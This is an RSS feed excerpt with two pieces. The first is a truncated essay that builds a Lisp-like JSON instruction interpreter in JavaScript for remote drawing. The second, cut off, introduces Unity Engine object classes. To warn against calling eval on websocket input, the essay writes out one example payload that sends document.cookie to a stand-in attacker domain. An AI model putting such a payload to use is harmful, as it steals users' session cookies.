<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><p><span><p>Every lisp hacker I ever met, myself included, thought that all those brackets in Lisp were off-putting and weird. At first, of course. Soon after we all came to the same epiphany: <em>lisp’s power lies in those brackets</em>! In this essay, we’ll go on a journey to that epiphany.</p><p>Say we were creating a program that let you draw stuff. If we wrote this in JavaScript, we might have functions like this:</p><pre><code><span>drawPoint</span><span>({x: </span><span>0</span><span>, y: </span><span>1</span><span>}, </span><span>'yellow'</span><span>)</span>
<span>drawLine</span><span>({x: </span><span>0</span><span>, y: </span><span>0</span><span>}, {x: </span><span>1</span><span>, y: </span><span>1</span><span>}, </span><span>'blue'</span><span>)</span>
<span>drawCircle</span><span>(</span><span>point</span><span>, </span><span>radius</span><span>, </span><span>'red'</span><span>)</span>
<span>rotate</span><span>(</span><span>shape</span><span>, </span><span>90</span><span>)</span>
<span>...</span></code></pre><p>So far, so cool.</p><p>Now, here’s a challenge: <strong>Can we support remote drawing?</strong></p><p>This means that a user would be able to “send” instructions to your screen, and you would see their drawing come to life.</p><p>How could we do it?</p><p>Well, say we set up a websocket connection. We could receive instructions from the user like this: </p><pre><code><span>websocket</span><span>.onMessage</span><span>(</span><span>data</span><span> </span><span>=&gt;</span><span> { </span>
<span>  </span><span>/* TODO */</span><span> </span>
<span>})</span></code></pre><p>To make it work off the bat, one option could be to take code strings as input:</p><pre><code><span>websocket</span><span>.onMessage</span><span>(</span><span>data</span><span> </span><span>=&gt;</span><span> {</span>
<span>  </span><span>eval</span><span>(</span><span>data</span><span>)</span>
<span>})</span></code></pre><p>Now the user could send <code>"drawLine({x: 0, y: 0}, {x: 1, y: 1}, 'red')"</code> and bam: we’ll draw a line! </p><p>But…your spidey sense may already be tingling. What if the user was malicious and managed to send us an instruction like this:</p><pre><code><span>"window.location='http://iwillp3wn.com?user_info=' + document.cookie"</span></code></pre><p>Uh oh…our cookie would get sent to iwillp3wn.com, and the malicious user would indeed pwn us. We can’t use eval; it’s too dangerous. </p><p>There lies our problem: we can’t use <code>eval</code>, but we need some way to receive arbitrary instructions.</p><p>Well, we could represent those instructions as JSON. We can map each JSON instruction to a special function, and that way we can control what runs. Here’s one way we can represent it:</p><pre><code><span>{</span>
<span>  instructions: [</span>
<span>    { functionName: </span><span>"drawLine"</span><span>, args: [{ x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>1</span><span>, y: </span><span>1</span><span> }, </span><span>"blue"</span><span>] },</span>
<span>  ];</span>
<span>}</span></code></pre><p>This JSON would translate to <code>drawLine({x: 0, y: 0}, {x: 1, y: 1},"blue")</code></p><p>We could support this pretty simply. Here’s how our <code>onMessage</code> could look:</p><pre><code><span>webSocket</span><span>.onMessage</span><span>(</span><span>instruction</span><span> </span><span>=&gt;</span><span> { </span>
<span>  </span><span>const</span><span> </span><span>fns</span><span> </span><span>=</span><span> {</span>
<span>    drawLine: </span><span>drawLine</span><span>,</span>
<span>    </span><span>...</span>
<span>  };</span>
<span>  </span><span>data</span><span>.</span><span>instructions</span><span>.forEach</span><span>((</span><span>ins</span><span>) </span><span>=&gt;</span><span> </span><span>fns</span><span>[</span><span>ins</span><span>.</span><span>functionName</span><span>](</span><span>...</span><span>ins</span><span>.</span><span>args</span><span>));</span>
<span>})</span></code></pre><p>That seems like it would work!</p><p>Let’s see if we can clean this up. Here’s our JSON:</p><pre><code><span>{</span>
<span>  instructions: [</span>
<span>    { functionName: </span><span>"drawLine"</span><span>, args: [{ x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>1</span><span>, y: </span><span>1</span><span> }, </span><span>"blue"</span><span>] },</span>
<span>  ];</span>
<span>}</span></code></pre><p>Well, since <em>every</em> instruction has a <code>functionName</code>, and an <code>args</code>, we don’t really need to spell that out. We <em>could</em> write it like this: </p><pre><code><span>{</span>
<span>  instructions: [[</span><span>"drawLine"</span><span>, { x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>1</span><span>, y: </span><span>1</span><span> }, </span><span>"blue"</span><span>]],</span>
<span>}</span></code></pre><p>Nice! We changed our object in favor of an array. To handle that, all we need is a rule: <strong>the</strong> <strong><em>first</em></strong> <strong>part of our instruction is the function name, and the <em>rest</em> are arguments.</strong> If we wrote that down, here’s how our <code>onMessage</code> would look: </p><pre><code><span>websocket</span><span>.onMessage</span><span>(</span><span>data</span><span> </span><span>=&gt;</span><span> { </span>
<span>  </span><span>const</span><span> </span><span>fns</span><span> </span><span>=</span><span> {</span>
<span>    drawLine: </span><span>drawLine</span><span>,</span>
<span>    </span><span>...</span>
<span>  };</span>
<span>  </span><span>data</span><span>.</span><span>instructions</span><span>.forEach</span><span>(([</span><span>fName</span><span>, </span><span>...</span><span>args</span><span>]) </span><span>=&gt;</span><span> </span><span>fns</span><span>[</span><span>fName</span><span>](</span><span>...</span><span>args</span><span>));</span>
<span>})</span></code></pre><p>And bam, <code>drawLine</code> would work again!</p><p>So far, we only used <code>drawLine</code>:</p><pre><code><span>drawLine</span><span>({x: </span><span>0</span><span>, y: </span><span>0</span><span>}, {x: </span><span>1</span><span>, y: </span><span>1</span><span>}, </span><span>'blue'</span><span>)</span>
<span>// same as</span>
<span>[</span><span>"drawLine"</span><span>, { x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>1</span><span>, y: </span><span>1</span><span> }]</span></code></pre><p>But what if we wanted to express something more powerful:</p><pre><code><span>rotate</span><span>(</span><span>drawLine</span><span>({x: </span><span>0</span><span>, y: </span><span>0</span><span>}, {x: </span><span>1</span><span>, y: </span><span>1</span><span>}, </span><span>'blue'</span><span>), </span><span>90</span><span>)</span></code></pre><p>Looking at that, we can translate it to an instruction like this:</p><pre><code><span>[</span><span>"rotate"</span><span>, [</span><span>"drawLine"</span><span>, { x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>1</span><span>, y: </span><span>1</span><span> }], </span><span>90</span><span>]</span></code></pre><p>Here, the <code>rotate</code> instruction has an argument that is in <em>itself</em> an instruction! Pretty powerful. Surprisingly, we just need to tweak our code a tiny bit to make it work:</p><pre><code><span>websocket</span><span>.onMessage</span><span>(</span><span>data</span><span> </span><span>=&gt;</span><span> { </span>
<span>  </span><span>const</span><span> </span><span>fns</span><span> </span><span>=</span><span> {</span>
<span>    drawLine: </span><span>drawLine</span><span>,</span>
<span>    </span><span>...</span>
<span>  };</span>
<span>  </span><span>const</span><span> </span><span>parseInstruction</span><span> </span><span>=</span><span> (</span><span>ins</span><span>) </span><span>=&gt;</span><span> {</span>
<span>    </span><span>if</span><span> (</span><span>!</span><span>Array</span><span>.isArray</span><span>(</span><span>ins</span><span>)) {</span>
<span>      </span><span>// this must be a primitive argument, like {x: 0 y: 0}</span>
<span>      </span><span>return</span><span> </span><span>ins</span><span>;</span>
<span>    }</span>
<span>    </span><span>const</span><span> [</span><span>fName</span><span>, </span><span>...</span><span>args</span><span>] </span><span>=</span><span> </span><span>ins</span><span>;</span>
<span>    </span><span>return</span><span> </span><span>fns</span><span>[</span><span>fName</span><span>](</span><span>...</span><span>args</span><span>.map</span><span>(</span><span>parseInstruction</span><span>));</span>
<span>  };</span>
<span>  </span><span>data</span><span>.</span><span>instructions</span><span>.forEach</span><span>(</span><span>parseInstruction</span><span>);</span>
<span>})</span></code></pre><p>Nice, We introduce a <code>parseInstruction</code> function. We can apply <code>parseInstruction</code> recursively to arguments, and support stuff like:</p><pre><code><span>[</span><span>"rotate"</span><span>, [</span><span>"rotate"</span><span>, [</span><span>"drawLine"</span><span>, { x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>1</span><span>, y: </span><span>1</span><span> }], </span><span>90</span><span>]]]</span></code></pre><p>Very cool!</p><p>Okay, let’s look at our JSON again:</p><pre><code><span>{</span>
<span>  instructions: [[</span><span>"drawLine"</span><span>, { x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>1</span><span>, y: </span><span>1</span><span> }]],</span>
<span>}</span></code></pre><p>Well, our data <em>only</em> contains instructions. Do we really need a key called <code>instructions</code>? </p><p>What if we did this: </p><pre><code><span>[</span><span>"do"</span><span>, [</span><span>"drawLine"</span><span>, { x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>1</span><span>, y: </span><span>1</span><span> }]]</span></code></pre><p>Instead of a top-level key, we could have a special instruction called <code>do</code>, which runs all the instructions it’s given.</p><p>Here’s one way we can implement it:</p><pre><code><span>websocket</span><span>.onMessage</span><span>(</span><span>data</span><span> </span><span>=&gt;</span><span> { </span>
<span>  </span><span>const</span><span> </span><span>fns</span><span> </span><span>=</span><span> {</span>
<span>    </span><span>...</span>
<span>    </span><span>do</span><span>: (</span><span>...</span><span>args</span><span>) </span><span>=&gt;</span><span> </span><span>args</span><span>[</span><span>args</span><span>.length </span><span>-</span><span> </span><span>1</span><span>],</span>
<span>  };</span>
<span>  </span><span>const</span><span> </span><span>parseInstruction</span><span> </span><span>=</span><span> (</span><span>ins</span><span>) </span><span>=&gt;</span><span> {</span>
<span>    </span><span>if</span><span> (</span><span>!</span><span>Array</span><span>.isArray</span><span>(</span><span>ins</span><span>)) {</span>
<span>      </span><span>// this must be a primitive argument, like {x: 0, y: 0}</span>
<span>      </span><span>return</span><span> </span><span>ins</span><span>;</span>
<span>    }</span>
<span>    </span><span>const</span><span> [</span><span>fName</span><span>, </span><span>...</span><span>args</span><span>] </span><span>=</span><span> </span><span>ins</span><span>;</span>
<span>    </span><span>return</span><span> </span><span>fns</span><span>[</span><span>fName</span><span>](</span><span>...</span><span>args</span><span>.map</span><span>(</span><span>parseInstruction</span><span>));</span>
<span>  };</span>
<span>  </span><span>parseInstruction</span><span>(</span><span>instruction</span><span>);</span>
<span>})</span></code></pre><p>Oh wow, that was easy. We just added <code>do</code> in <code>fns</code>. Now we can support an instruction like this:</p><pre><code><span>[</span>
<span>  </span><span>"do"</span><span>,</span>
<span>  [</span><span>"drawPoint"</span><span>, { x: </span><span>0</span><span>, y: </span><span>0</span><span> }],</span>
<span>  [</span><span>"rotate"</span><span>, [</span><span>"drawLine"</span><span>, { x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>1</span><span>, y: </span><span>1</span><span> }], </span><span>90</span><span>]],</span>
<span>];</span></code></pre><p>Let’s make it more interesting. What if we wanted to support <em>definitions?</em></p><pre><code><span>const</span><span> </span><span>shape</span><span> </span><span>=</span><span> </span><span>drawLine</span><span>({x: </span><span>0</span><span>, y: </span><span>0</span><span>}, {x: </span><span>1</span><span>, y: </span><span>1</span><span>}, </span><span>'red'</span><span>)</span>
<span>rotate</span><span>(</span><span>shape</span><span>, </span><span>90</span><span>)</span></code></pre><p>If we could support definitions, our remote user could write some very expressive instructions! Let’s convert our code to the kind of data structure we’ve been playing with:</p><pre><code><span>[</span><span>"def"</span><span>, </span><span>"shape"</span><span>, [</span><span>"drawLine"</span><span>, { x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>1</span><span>, y: </span><span>1</span><span> }]]</span>
<span>[</span><span>"rotate"</span><span>, </span><span>"shape"</span><span>, </span><span>90</span><span>]</span></code></pre><p>Noot bad! If we can support an instruction like that, we’d be golden! Here’s how: </p><pre><code><span>websocket</span><span>.onMessage</span><span>(</span><span>data</span><span> </span><span>=&gt;</span><span> { </span>
<span>  </span><span>const</span><span> </span><span>variables</span><span> </span><span>=</span><span> {};</span>
<span>  </span><span>const</span><span> </span><span>fns</span><span> </span><span>=</span><span> {</span>
<span>    </span><span>...</span>
<span>    </span><span>def</span><span>: (</span><span>name</span><span>, </span><span>v</span><span>) </span><span>=&gt;</span><span> {</span>
<span>      </span><span>variables</span><span>[</span><span>name</span><span>] </span><span>=</span><span> </span><span>v</span><span>;</span>
<span>    },</span>
<span>  };</span>
<span>  </span><span>const</span><span> </span><span>parseInstruction</span><span> </span><span>=</span><span> (</span><span>ins</span><span>) </span><span>=&gt;</span><span> {</span>
<span>    </span><span>if</span><span> (</span><span>variables</span><span>[</span><span>ins</span><span>]) {</span>
<span>      </span><span>// this must be some kind of variable, like "shape"</span>
<span>      </span><span>return</span><span> </span><span>variables</span><span>[</span><span>ins</span><span>];</span>
<span>    }</span>
<span>    </span><span>if</span><span> (</span><span>!</span><span>Array</span><span>.isArray</span><span>(</span><span>ins</span><span>)) {</span>
<span>      </span><span>// this must be a primitive argument, like {x: 0 y: 0}</span>
<span>      </span><span>return</span><span> </span><span>ins</span><span>;</span>
<span>    }</span>
<span>    </span><span>const</span><span> [</span><span>fName</span><span>, </span><span>...</span><span>args</span><span>] </span><span>=</span><span> </span><span>ins</span><span>;</span>
<span>    </span><span>return</span><span> </span><span>fns</span><span>[</span><span>fName</span><span>](</span><span>...</span><span>args</span><span>.map</span><span>(</span><span>parseInstruction</span><span>));</span>
<span>  };</span>
<span>  </span><span>parseInstruction</span><span>(</span><span>instruction</span><span>);</span>
<span>})</span></code></pre><p>Here, we introduced a <code>variables</code> object, which keeps track of every variable we define.  A special <code>def</code> function updates that <code>variables</code> object. Now we can run this instruction: </p><pre><code><span>[</span>
<span>  </span><span>"do"</span><span>,</span>
<span>  [</span><span>"def"</span><span>, </span><span>"shape"</span><span>, [</span><span>"drawLine"</span><span>, { x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>1</span><span>, y: </span><span>1</span><span> }]],</span>
<span>  [</span><span>"rotate"</span><span>, </span><span>"shape"</span><span>, </span><span>90</span><span>],</span>
<span>];</span></code></pre><p>Not bad!</p><p>Let’s step it up a notch. What if we let our remote user <em>define their own functions?</em> </p><p>Say they wanted to write something like this:</p><pre><code><span>const</span><span> </span><span>drawTriangle</span><span> </span><span>=</span><span> </span><span>function</span><span>(</span><span>left</span><span>, </span><span>top</span><span>, </span><span>right</span><span>, </span><span>color</span><span>) { </span>
<span>   </span><span>drawLine</span><span>(</span><span>left</span><span>, </span><span>top</span><span>, </span><span>color</span><span>);</span>
<span>   </span><span>drawLine</span><span>(</span><span>top</span><span>, </span><span>right</span><span>, </span><span>color</span><span>); </span>
<span>   </span><span>drawLine</span><span>(</span><span>left</span><span>, </span><span>right</span><span>, </span><span>color</span><span>); </span>
<span>} </span>
<span>drawTriangle</span><span>(</span><span>...</span><span>)</span></code></pre><p>How would we do it? Let’s follow our intuition again. If we transcribe this to our data representation, here’s how it could look:</p><pre><code><span>  [</span><span>"def"</span><span>, </span><span>"drawTriangle"</span><span>,</span>
<span>  [</span><span>"fn"</span><span>, [</span><span>"left"</span><span>, </span><span>"top"</span><span>, </span><span>"right"</span><span>, </span><span>"color"</span><span>],</span>
<span>    [</span><span>"do"</span><span>,</span>
<span>      [</span><span>"drawLine"</span><span>, </span><span>"left"</span><span>, </span><span>"top"</span><span>, </span><span>"color"</span><span>],</span>
<span>      [</span><span>"drawLine"</span><span>, </span><span>"top"</span><span>, </span><span>"right"</span><span>, </span><span>"color"</span><span>],</span>
<span>      [</span><span>"drawLine"</span><span>, </span><span>"left"</span><span>, </span><span>"right"</span><span>, </span><span>"color"</span><span>],</span>
<span>    ],</span>
<span>  ],</span>
<span>],</span>
<span>[</span><span>"drawTriangle"</span><span>, { x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>3</span><span>, y: </span><span>3</span><span> }, { x: </span><span>6</span><span>, y: </span><span>0</span><span> }, </span><span>"blue"</span><span>],</span></code></pre><p>Here, </p><pre><code><span>const</span><span> </span><span>drawTriangle</span><span> </span><span>=</span><span> </span><span>...</span></code></pre><p>translates to </p><pre><code><span>[</span><span>"def"</span><span>, </span><span>"drawTriangle"</span><span>, …]. </span></code></pre><p>And</p><pre><code><span>function</span><span>(</span><span>left</span><span>, </span><span>top</span><span>, </span><span>right</span><span>, </span><span>color</span><span>) {…}</span></code></pre><p>translates to </p><pre><code><span>[</span><span>"fn"</span><span>, [</span><span>"left"</span><span>, </span><span>"top"</span><span>, </span><span>"right"</span><span>, </span><span>"color"</span><span>], [</span><span>"do"</span><span> </span><span>...</span><span>]]</span></code></pre><p>All we need to do is to parse this instruction somehow, and bam, we are good to go!</p><p>The key to making this work is our <code>["fn", …]</code> instruction. What if we did this:</p><pre><code><span>const</span><span> </span><span>parseFnInstruction</span><span> </span><span>=</span><span> (</span><span>args</span><span>, </span><span>body</span><span>, </span><span>oldVariables</span><span>) </span><span>=&gt;</span><span> {</span>
<span>  </span><span>return</span><span> (</span><span>...</span><span>values</span><span>) </span><span>=&gt;</span><span> {</span>
<span>    </span><span>const</span><span> </span><span>newVariables</span><span> </span><span>=</span><span> {</span>
<span>      </span><span>...</span><span>oldVariables</span><span>,</span>
<span>      </span><span>...</span><span>mapArgsWithValues</span><span>(</span><span>args</span><span>, </span><span>values</span><span>),</span>
<span>    };</span>
<span>    </span><span>return</span><span> </span><span>parseInstruction</span><span>(</span><span>body</span><span>, </span><span>newVariables</span><span>);</span>
<span>  };</span>
<span>};</span></code></pre><p>When we find a <code>fn</code>  instruction, we run <code>parseFnInstruction</code>. This produces a new javascript function. We would replace <code>drawTriangle</code> here with that function:</p><pre><code><span>[</span><span>"drawTriangle"</span><span>, { x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>3</span><span>, y: </span><span>3</span><span> }, { x: </span><span>6</span><span>, y: </span><span>0</span><span> }, </span><span>"blue"</span><span>]</span></code></pre><p>So when that function is run, <code>values</code> would become:</p><pre><code><span>[{ x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>3</span><span>, y: </span><span>3</span><span> }, { x: </span><span>6</span><span>, y: </span><span>0</span><span> }, </span><span>"blue"</span><span>]</span></code></pre><p>After that, </p><pre><code><span>const</span><span> </span><span>newVariables</span><span> </span><span>=</span><span> {</span><span>...</span><span>oldVariables</span><span>, </span><span>...</span><span>mapArgsWithValues</span><span>(</span><span>args</span><span>, </span><span>values</span><span>)}</span></code></pre><p>Would create a new <code>variables</code> object, that includes a mapping of the function arguments to these newly provided values:</p><pre><code><span>const</span><span> </span><span>newVariables</span><span> </span><span>=</span><span> {</span>
<span>  </span><span>...</span><span>oldVariables</span><span>,</span>
<span>  left: { x: </span><span>0</span><span>, y: </span><span>0</span><span> }, </span>
<span>  top: { x: </span><span>3</span><span>, y: </span><span>3</span><span> },</span>
<span>  right: {x: </span><span>6</span><span>, y: </span><span>0</span><span> }, </span>
<span>  color: </span><span>"blue"</span><span>, </span>
<span>}</span></code></pre><p>Then, we can take the function body, in this case: </p><pre><code><span>      [</span>
<span>        </span><span>"do"</span><span>,</span>
<span>        [</span><span>"drawLine"</span><span>, </span><span>"left"</span><span>, </span><span>"top"</span><span>, </span><span>"color"</span><span>],</span>
<span>        [</span><span>"drawLine"</span><span>, </span><span>"top"</span><span>, </span><span>"right"</span><span>, </span><span>"color"</span><span>],</span>
<span>        [</span><span>"drawLine"</span><span>, </span><span>"left"</span><span>, </span><span>"right"</span><span>, </span><span>"color"</span><span>],</span>
<span>      ],</span></code></pre><p>And run it through <code>parseInstruction</code>, with our <code>newVariables</code>. With that <code>"left"</code> would be looked up as a variable and map to <code>{x: 0, y: 0}</code>. </p><p>If we did that, voila, the major work to support functions would be done!</p><p>Let’s follow through on our plan. The first thing we need to do, is to have <code>parseInstruction</code> accept <code>variables</code> as an argument. To do that, we need to update <code>parseInstruction</code>, and wherever it's called:</p><pre><code><span>  </span><span>const</span><span> </span><span>parseInstruction</span><span> </span><span>=</span><span> (</span><span>ins</span><span>, </span><span>variables</span><span>) </span><span>=&gt;</span><span> {</span>
<span>    </span><span>...</span>
<span>    </span><span>return</span><span> </span><span>fn</span><span>(</span><span>...</span><span>args</span><span>.map</span><span>((</span><span>arg</span><span>) </span><span>=&gt;</span><span> </span><span>parseInstruction</span><span>(</span><span>arg</span><span>, </span><span>variables</span><span>)));</span>
<span>  };</span>
<span>  </span><span>parseInstruction</span><span>(</span><span>instruction</span><span>, </span><span>variables</span><span>);</span></code></pre><p>Next, we’ll want to add a special check to detect if we have a “fn” instruction:</p><pre><code><span>  </span><span>const</span><span> </span><span>parseInstruction</span><span> </span><span>=</span><span> (</span><span>ins</span><span>, </span><span>variables</span><span>) </span><span>=&gt;</span><span> {</span>
<span>    </span><span>...</span>
<span>    </span><span>const</span><span> [</span><span>fName</span><span>, </span><span>...</span><span>args</span><span>] </span><span>=</span><span> </span><span>ins</span><span>;</span>
<span>    </span><span>if</span><span> (</span><span>fName</span><span> </span><span>==</span><span> </span><span>"fn"</span><span>) {</span>
<span>      </span><span>return</span><span> </span><span>parseFnInstruction</span><span>(</span><span>...</span><span>args</span><span>, </span><span>variables</span><span>);</span>
<span>    }</span>
<span>    </span><span>...</span>
<span>    </span><span>return</span><span> </span><span>fn</span><span>(</span><span>...</span><span>args</span><span>.map</span><span>((</span><span>arg</span><span>) </span><span>=&gt;</span><span> </span><span>parseInstruction</span><span>(</span><span>arg</span><span>, </span><span>variables</span><span>)));</span>
<span>  };</span>
<span>  </span><span>parseInstruction</span><span>(</span><span>instruction</span><span>, </span><span>variables</span><span>);</span></code></pre><p>Now, our <code>parseFnInstruction</code>: </p><pre><code><span>const</span><span> </span><span>mapArgsWithValues</span><span> </span><span>=</span><span> (</span><span>args</span><span>, </span><span>values</span><span>) </span><span>=&gt;</span><span> { </span>
<span>  </span><span>return</span><span> </span><span>args</span><span>.reduce</span><span>((</span><span>res</span><span>, </span><span>k</span><span>, </span><span>idx</span><span>) </span><span>=&gt;</span><span> {</span>
<span>    </span><span>res</span><span>[</span><span>k</span><span>] </span><span>=</span><span> </span><span>values</span><span>[</span><span>idx</span><span>];</span>
<span>    </span><span>return</span><span> </span><span>res</span><span>;</span>
<span>  }, {});</span>
<span>}</span>
<span>const</span><span> </span><span>parseFnInstruction</span><span> </span><span>=</span><span> (</span><span>args</span><span>, </span><span>body</span><span>, </span><span>oldVariables</span><span>) </span><span>=&gt;</span><span> {</span>
<span>  </span><span>return</span><span> (</span><span>...</span><span>values</span><span>) </span><span>=&gt;</span><span> {</span>
<span>    </span><span>const</span><span> </span><span>newVariables</span><span> </span><span>=</span><span> {</span><span>...</span><span>oldVariables</span><span>, </span><span>...</span><span>mapArgsWithValues</span><span>(</span><span>args</span><span>, </span><span>values</span><span>)}</span>
<span>    </span><span>return</span><span> </span><span>parseInstruction</span><span>(</span><span>body</span><span>, </span><span>newVariables</span><span>);</span>
<span>  };</span>
<span>};</span></code></pre><p>It works exactly like we …</p></span></p></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://stopa.io/post/265">https://stopa.io/post/265</a></em></p>]]>
            </description>
            <link>https://stopa.io/post/265</link>
            <guid isPermaLink="false">hacker-news-small-sites-24892297</guid>
            <pubDate>Mon, 26 Oct 2020 02:26:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Understanding Unity Engine Objects (Unity for Engineers #5)]]>
            </title>
            <description>
<![CDATA[
Score 15 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24891684">thread link</a>) | @Eyas
<br/>
October 25, 2020 | https://blog.eyas.sh/2020/10/unity-for-engineers-pt5-object-component/ | <a href="https://web.archive.org/web/*/https://blog.eyas.sh/2020/10/unity-for-engineers-pt5-object-component/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>We already discussed
<a href="https://blog.eyas.sh/2020/10/unity-for-engineers-pt1-basic-concepts#gameobject">Game Objects</a> and
<a href="https://blog.eyas.sh/2020/10/unity-for-engineers-pt1-basic-concepts#component">Components</a> as two
of the fundamental building blocks of the Unity Engine. Today, we’ll discuss
their programmatic representation.</p><p><em>This is <strong><a href="https://blog.eyas.sh/tag/unity-for-software-engineers">Unity for Software Engineers</a></strong>,
a series for folks familiar with software development best practices seeking an
accelerated introduction to Unity as an engine and editor. More is coming over
the next few weeks, so <a href="http://eepurl.com/gVgusL">consider subscribing</a> for
updates.</em></p><p>The Unity Engine <em>runtime</em> is primarily written in C++, and much of the Engine’s
primitives (such as the game objects and their components) live in C++ land.
You’ll also know that the Unity Engine <em>API</em> is in C#. The API gives you access
to all of Unity’s native objects in a way that<!-- -->—<!-- -->save for a few pitfalls
we’ll discuss today<!-- -->—<!-- -->feels like intuitive, idiomatic C#.</p><figure><p><img src="https://blog.eyas.sh/e1e4978ec3c78301c0c6b929c61f8bf7/object-hierarchy.svg" alt="A GameObject, MonoBehaviour, and ScriptableObject all inherit from UnityEngine Object."></p><figcaption><p>The <em>C#</em> class hierarchy of <code>UnityEngine.Object</code>, <code>GameObject</code>,
<code>ScriptableObject</code>, <code>Component</code>, and their children. This should map to the
<em>conceptual</em> hierarchy of how to think about these objects, though sometimes the
runtime implementation will look different.</p></figcaption></figure><h2 id="unityobject">UnityEngine.Object</h2><p>At the top of the Unity Object hierarchy sits <strong><code>UnityEngine.Object</code></strong>. For the
most part provides a <code>name</code> string, an <code>int GetInstanceID()</code> method, and a bunch
of equality comparers.</p><p>The class also provides a <code>static void Destroy(Object obj)</code> method (and some
overloads) that destroys a <code>UnityEngine.Object</code> and any of its subclasses. When
an Object is destroyed, the <em>native</em> part of the object is freed from memory,
and the smaller <em>managed</em> part will be garbage collected <em>at some point</em> after
there are no more references to it.</p><p>Because your valid reference to a <code>UnityEngine.Object</code> can point to a destroyed
native object, <code>UnityEngine.Object</code> overrides C#‘s <code>operator==</code> and <code>operator!=</code>
to make a destroyed Object <em>appear</em> null. Simply accessing methods on a
destroyed object will return <code>NullReferenceException</code>, albeit with a friendlier
error message that tells you which object you were trying to access.</p><h2 id="gameobject">GameObject</h2><p>A <strong>GameObject</strong> derives from Object and represents anything in your scene.</p><p>Let’s start at a high-level: A GameObject inherits a name and instance ID from
its parent. Otherwise, conceptually, a GameObject</p><ul><li>has a list of <a href="#component"><strong>Components</strong></a> on it,</li><li>has a <code>tag</code> string for organizational purposes, and</li><li>belongs to a <a href="https://docs.unity3d.com/Manual/Layers.html">layer</a>.</li></ul><p>A GameObject’s state</p><ul><li>is the product of all of its <em>Components’</em> state, and</li><li>whether an object is active or not.</li></ul><p>Let’s dig a bit deeper. When starting, most of the interesting stuff in a
GameObject is in its <strong>Components</strong>. A GameObject has at least one Component:
its <a href="https://docs.unity3d.com/ScriptReference/Transform.html"><code>Transform</code></a>. A
Transform describes the position and rotation of the GameObject. A Transform
includes helper properties that show an object’s <em>absolute world</em> position and
rotation, as well as the position and rotation <em>relative</em> to its parent. In the
Editor, the Transform position and rotation are set from the <em>parent relative</em>
variants.</p><p>Since every GameObject has a Transform (and also, given that a Transform is
frequently needed/accessed), the GameObject directly exposes a
<code>Transform transform</code> public property.</p><p>You can access individual components from <code>T GetComponent&lt;T&gt;()</code>, or lists of
components from <code>T[] GetComponents&lt;T&gt;()</code>, etc. These methods search through all
components on a GameObject and return ones with a compatible type (or null, if
none exist in the singular case). Since these methods search through components
and check type compatibility, it is often recommended to cache this lookup.</p><p>If you are building/extending a GameObject by hand, you can always use
<code>T AddComponent&lt;T&gt;()</code>. In most cases, however, you’re better off using the
Editor.</p><p>Individual Objects (a Component or ScriptableObject) might refer to other
<code>GameObjects</code> in a few ways:</p><ul><li><p><strong>By reference</strong>. By exposing a <code>GameObject</code> <em>serialized field</em> that you
then set from the inspector.</p><p><em>We have discussed serialization extensively throughout the series:
<a href="https://blog.eyas.sh/2020/10/unity-for-engineers-pt1-basic-concepts#serialization">as a fundamental concept</a>
and in our tour of the Editor, when
<a href="https://blog.eyas.sh/2020/10/unity-for-engineers-pt4-editor-tour#inspector">describing the Inspector</a>,
and the <a href="https://blog.eyas.sh/2020/10/unity-for-engineers-pt2-six-practices">practice</a> of using
the Inspector as an injection framework</em>.</p></li><li><p><strong>Using tags</strong>. Every Game Object can have a <em>tag</em> string. You can find
objects in the scene using that tag through the static functions
<code>GameObject.FindGameObjectsWithTag</code> and <code>GameObject.FindGameObjectWithTag</code>.
A GameObject also exposes a public <code>bool CompareTag(string tag)</code> method.</p><p>This is a quick-and-dirty way to get the job done, but is still a popular
way. A common use of this in the wild is to have a <code>"Player"</code> tag to find
the Player. Ideally, these methods should not be called every frame, so if
you have to use them, consider caching the result.</p></li><li><p><strong>Using layers</strong>. A layer is an <code>int</code> between 0 and 31. Every Game Object is
in exactly one layer.</p><p>While you can’t directly look up all objects in a layer, if you already have
a reference to a GameObject (e.g., in a collision event), you can check a
GameObject against a
<a href="https://docs.unity3d.com/ScriptReference/LayerMask.html"><code>LayerMask</code></a>. A
<code>LayerMask</code> is typically used in functions like <code>Physics.Raycast()</code>. This
allows you to find objects with colliders intersecting with a given <em>ray</em>.
Passing a <code>LayerMask</code> to <code>Physics.Raycast()</code> will only return objects within
the specified set of layers.</p><p>Inside the Unity Engine, <em>Cameras</em> make heavy use of layers. E.g., you can
have one camera that renders “everything but UI”, and overlay another camera
for an in-game HUD, etc.</p></li><li><p><strong>Using indirect references</strong>. There are many reasons why the methods above
might be insufficient: you might not want to use tags to avoid depending on
copy-pasted strings, and layers might not fit your use case. If referencing
a fellow object in-scene is not an option (e.g., you’re dealing with a
dynamic set of objects or don’t have access to the current scene objects in
the context you need this reference, etc.), then you might want to look
further.</p><p>For this, an increasingly popular concept is <em>runtime sets</em> Scriptable
Objects. You can read more about this in Unity’s how-to article on
<a href="https://unity.com/how-to/architect-game-code-scriptable-objects">architecting your game with ScriptableObjects</a>,
based on <a href="https://www.youtube.com/watch?v=raQ3iHhE_Kk">the talk</a> by Ryan
Hipple. If you have an hour to spare, you might want to watch the whole
thing.</p></li></ul><p>A GameObject also exposes a <code>BroadcastMessage</code> and <code>SendMessage</code> functions that
propagate <em>messages</em> (described in the <a href="#component"><strong>Component</strong></a> section) to
all components in or under it.</p><figure><p><span>
